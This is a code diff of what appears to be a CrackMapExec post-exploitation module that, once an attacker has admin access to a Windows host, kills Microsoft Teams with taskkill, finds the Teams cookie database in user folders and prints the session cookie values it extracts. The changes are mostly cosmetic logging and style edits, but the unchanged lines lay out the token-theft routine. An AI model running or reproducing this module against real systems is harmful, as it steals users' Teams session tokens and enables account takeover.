@@ -1,10 +1,8 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 
-import urllib.parse
 import sqlite3
-from csv import reader
-from time import sleep
+
 
 class CMEModule:
 
@@ -15,11 +13,11 @@ class CMEModule:
     multiple_hosts = False
 
     def options(self, context, module_options):
-        '''
-        '''
+        """
+        """
 
     def on_admin_login(self, context, connection):
-        context.log.info('Killing all Teams process to open the cookie file')
+        context.log.display('Killing all Teams process to open the cookie file')
         connection.execute("taskkill /F /T /IM teams.exe")
         #sleep(3)
         found = 0
@@ -38,9 +36,9 @@ class CMEModule:
                     if 'STATUS_SHARING_VIOLATION' in str(e):
                         context.log.debug(str(e))
                         context.log.highlight("Found Cookie file in path " + path)
-                        context.log.error('Cannot retrieve file, most likely Teams is running which prevents us from retrieving the Cookies database')
+                        context.log.fail('Cannot retrieve file, most likely Teams is running which prevents us from retrieving the Cookies database')
         if found == 0:
-            context.log.info('No cookie file found in Users folder')
+            context.log.display('No cookie file found in Users folder')
 
     @staticmethod
     def parse_file(context, name):
@@ -49,11 +47,11 @@ class CMEModule:
             c = conn.cursor()
             c.execute("SELECT value FROM cookies WHERE name = '" + name + "'")
             row = c.fetchone()
-            if row == None:
-                context.log.error("No " + name + " present in Microsoft Teams Cookies database")
+            if row is None:
+                context.log.fail("No " + name + " present in Microsoft Teams Cookies database")
             else:
                 context.log.success("Succesfully extracted " + name + ": ")
                 context.log.success(row[0])
             conn.close()
         except Exception as e:
-            context.log.error(str(e))
+            context.log.fail(str(e))
